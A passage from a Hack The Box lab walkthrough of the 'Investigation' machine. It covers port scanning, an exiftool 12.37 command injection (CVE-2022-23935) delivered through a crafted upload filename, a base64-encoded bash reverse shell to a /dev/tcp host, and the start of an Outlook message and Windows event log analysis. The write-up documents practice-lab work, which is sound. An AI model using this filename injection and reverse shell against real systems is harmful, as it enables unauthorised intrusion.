@@ -1,0 +1,305 @@
+<!doctype html><html lang="es"><head><title>Investigation | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a website that allows to analyze image file metadata with exiftool. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with sudo, which behind the scenes runs a Perl script that leads to the privilege escalation"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a website that allows to analyze image file metadata with exiftool. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with sudo, which behind the scenes runs a Perl script that leads to the privilege escalation"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a website that allows to analyze image file metadata with exiftool. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with sudo, which behind the scenes runs a Perl script that leads to the privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a website that allows to analyze image file metadata with exiftool. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with sudo, which behind the scenes runs a Perl script that leads to the privilege escalation"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a website that allows to analyze image file metadata with exiftool. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with sudo, which behind the scenes runs a Perl script that leads to the privilege escalation"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/HTB/Investigation/Investigation.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Investigation/Investigation.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Investigation/Investigation.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Investigation"><meta property="twitter:title" content="Investigation"><meta property="og:title" content="Investigation"><meta property="og:url" content="https://7rocky.github.io/en/htb/investigation/"><meta itemprop="keywords" content="perl,cve,sudo,forensics,file-upload,metadata,command-injection,reversing,static-code-analysis,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/investigation/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/investigation/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/investigation/&amp;text=Investigation" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/investigation/&amp;title=Investigation" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Investigation</h1><time class="mt4 f6 dib tracked" datetime="2023-04-22T00:00:00+01:00">22 / 04 / 2023</time><br><p class="mb4 f6 dib tracked">7 minutes to read</p></header><div class="htb-image"><img alt="Investigation" src="/images/HTB/Investigation/Investigation.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/perl" title="Perl">Perl</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/forensics" title="Forensics">Forensics</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-upload" title="File upload">File upload</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/metadata" title="File metadata">File metadata</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/reversing" title="Reverse Engineering">Reverse Engineering</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/static-code-analysis" title="Static Code Analysis">Static Code Analysis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#extracting-windows-outlook-messages">Extracting Windows Outlook messages</a></li><li><a href="#analyzing-windows-event-logs">Analyzing Windows event logs</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#reverse-engineering">Reverse engineering</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.197</li><li><strong>Release</strong>: 21 / 01 / 2023</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.197
+Nmap scan report for 10.10.11.197
+Host is up (0.060s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
+|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
+|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: eForenzics - Premier Digital Forensics
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 10.65 seconds
+</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.197</code>, we will be redirected to <code>http://eforenzics.htb</code>. After setting the domain in <code>/etc/hosts</code>, we have this website:</p><p><img src="/images/HTB/Investigation/Investigation-1.png" alt="Investigation 1"></p><p>There&rsquo;s another website at <code>/service.html</code> (clicking on &ldquo;Go!&rdquo;):</p><p><img src="/images/HTB/Investigation/Investigation-2.png" alt="Investigation 2"></p><p>It shows a functionality to upload JPEG images. The endpoint is <code>/upload.php</code>:</p><p><img src="/images/HTB/Investigation/Investigation-3.png" alt="Investigation 3"></p><p>If we access it directly, we cause an error:</p><p><img src="/images/HTB/Investigation/Investigation-4.png" alt="Investigation 4"></p><p>Let&rsquo;s try to upload a normal JPEG image:</p><p><img src="/images/HTB/Investigation/Investigation-5.png" alt="Investigation 5"></p><p><img src="/images/HTB/Investigation/Investigation-6.png" alt="Investigation 6"></p><p>And this is the generated report:</p><p><img src="/images/HTB/Investigation/Investigation-7.png" alt="Investigation 7"></p><p>As can be seen, it ran <code>exiftool</code> version 12.37.</p><h2 id="foothold">Foothold</h2><p>If we research a bit, we will find <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23935">CVE-2022-23935</a>. A proof of concept can be found in this <a href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429">GitHub Gist</a>. Basically, it allows us to inject commands putting a pipe (<code>|</code>) at the end of the file name.</p><p>Hence, let&rsquo;s obtain a reverse shell on the system:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">mv</span> <span class="mtku">image.jpg</span> <span class="code-dark-yellow">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash |'</span>  
+</code></pre></div><p>Now, we upload the malicious image and the server hangs:</p><p><img src="/images/HTB/Investigation/Investigation-8.png" alt="Investigation 8"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.197.
+Ncat: Connection from 10.10.11.197:48958.
+bash: cannot set terminal process group (963): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@investigation:~/uploads/1674422827$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@investigation:~/uploads/1674422827$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@investigation:~/uploads/1674422827$ export TERM=xterm
+www-data@investigation:~/uploads/1674422827$ export SHELL=bash
+www-data@investigation:~/uploads/1674422827$ stty rows 50 columns 158
+</code></pre></div><p>We are in.</p><h2 id="system-enumeration">System enumeration</h2><p>There&rsquo;s a user called <code>smorton</code> that owns a strange file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@investigation:~$ ls /home
+smorton
+www-data@investigation:~$ find / -user smorton 2>/dev/null
+/home/smorton
+/usr/local/investigation/Windows Event Logs for Analysis.msg  
+</code></pre></div><p>It is a Microsoft Outlook Message:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@investigation:~$ file /usr/local/investigation/Windows\ Event\ Logs\ for\ Analysis.msg  
+/usr/local/investigation/Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
+</code></pre></div><p>Let&rsquo;s transfer it to our machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@investigation:~$ cd /usr/local/investigation
+www-data@investigation:/usr/local/investigation$ python3 -m http.server  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.11.197:8000/Windows%20Event%20Logs%20for%20Analysis.msg  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">Windows\ Event\ Logs\ for\ Analysis.msg</span>
+Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
+</code></pre></div><h3 id="extracting-windows-outlook-messages">Extracting Windows Outlook messages</h3><p>After some research, we find several tools to extract information from this file (more details at <a href="https://superuser.com/questions/99250/opening-a-msg-file-in-ubuntu">superuser.com</a>). I will use <a href="https://pypi.org/project/extract-msg/"><code>extract-msg</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">extract_msg</span> <span class="mtku">Windows\ Event\ Logs\ for\ Analysis.msg</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ls</span> -l --time-style=+
+total 2084
+drwxr-xr-x 4 root root     128  <span class="code-blue">'2022-01-16_0130 Windows Event Logs for Analysis'</span>  
+-rw-r--r-- 1 root root 1308160  'Windows Event Logs for Analysis.msg'
+</code></pre></div><p>There&rsquo;s an email message from Thomas Jones to Steve Morton:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ls</span> -l --time-style=+ <span class="mtku">2022-01-16_0130\ Windows\ Event\ Logs\ for\ Analysis/</span>
+total 1252
+-rw-r--r-- 1 root root 1276591  <span class="code-red">evtx-logs.zip</span>
+-rw-r--r-- 1 root root     441  message.txt
+<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">2022-01-16_0130\ Windows\ Event\ Logs\ for\ Analysis/message.txt</span>
+From: Thomas Jones &lt;thomas.jones@eforenzics.htb&gt;
+Sent: Sun, 16 Jan 2022 01:30:29 +0100
+To: Steve Morton &lt;steve.morton@eforenzics.htb&gt;
+Subject: Windows Event Logs for Analysis
+-----------------
+
+Hi Steve,
+
+Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures.  
+
+Regards.
+Tom
+</code></pre></div><h3 id="analyzing-windows-event-logs">Analyzing Windows event logs</h3><p>We will need to analyze a bunch of Windows event logs from the EVTX file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> <span class="mtku">2022-01-16_0130\ Windows\ Event\ Logs\ for\ Analysis/evtx-logs.zip</span>  
+Archive:  2022-01-16_0130 Windows Event Logs for Analysis/evtx-logs.zip
+  inflating: security.evtx
+</code></pre></div><p>For that, we can use <a href="https://pypi.org/project/python-evtx/"><code>python-evtx</code></a>. A Windows event log is just an XML object like the following:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;</span><span class="mtk5">Event</span><span class="mtk1"> </span><span class="mtk8">xmlns</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://schemas.microsoft.com/win/2004/08/events/ev</span><span class="mtk4 detected-link">ent</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">System</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Provider</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"Microsoft-Windows-Security-Auditing"</span><span class="mtk1"> </span><span class="mtk8">Guid</span><span class="mtk1">=</span><span class="mtk4">"{54849625-5478-4994-a5ba-3e3b0328c30d}"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">Provider</span><span class="mtk1">&gt;</span>  
+<span class="mtk1">    &lt;</span><span class="mtk5">EventID</span><span class="mtk1"> </span><span class="mtk8">Qualifiers</span><span class="mtk1">=</span><span class="mtk4">""</span><span class="mtk1">&gt;4624&lt;/</span><span class="mtk5">EventID</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Version</span><span class="mtk1">&gt;2&lt;/</span><span class="mtk5">Version</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Level</span><span class="mtk1">&gt;0&lt;/</span><span class="mtk5">Level</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Task</span><span class="mtk1">&gt;12544&lt;/</span><span class="mtk5">Task</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Opcode</span><span class="mtk1">&gt;0&lt;/</span><span class="mtk5">Opcode</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Keywords</span><span class="mtk1">&gt;0x8020000000000000&lt;/</span><span class="mtk5">Keywords</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">TimeCreated</span><span class="mtk1"> </span><span class="mtk8">SystemTime</span><span class="mtk1">=</span><span class="mtk4">"2022-08-01 16:00:39.944632"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">TimeCreated</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">EventRecordID</span><span class="mtk1">&gt;11363364&lt;/</span><span class="mtk5">EventRecordID</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Correlation</span><span class="mtk1"> </span><span class="mtk8">ActivityID</span><span class="mtk1">=</span><span class="mtk4">"{6a946884-a5bc-0001-d968-946abca5d801}"</span><span class="mtk1"> </span><span class="mtk8">RelatedActivityID</span><span class="mtk1">=</span><span class="mtk4">""</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">Correlation</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Execution</span><span class="mtk1"> </span><span class="mtk8">ProcessID</span><span class="mtk1">=</span><span class="mtk4">"628"</span><span class="mtk1"> </span><span class="mtk8">ThreadID</span><span class="mtk1">=</span><span class="mtk4">"1664"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">Execution</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Channel</span><span class="mtk1">&gt;Security&lt;/</span><span class="mtk5">Channel</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Computer</span><span class="mtk1">&gt;eForenzics-DI&lt;/</span><span class="mtk5">Computer</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Security</span><span class="mtk1"> </span><span class="mtk8">UserID</span><span class="mtk1">=</span><span class="mtk4">""</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">Security</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;/</span><span class="mtk5">System</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;</span><span class="mtk5">EventData</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"SubjectUserSid"</span><span class="mtk1">&gt;S-1-5-18&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"SubjectUserName"</span><span class="mtk1">&gt;EFORENZICS-DI$&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"SubjectDomainName"</span><span class="mtk1">&gt;WORKGROUP&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
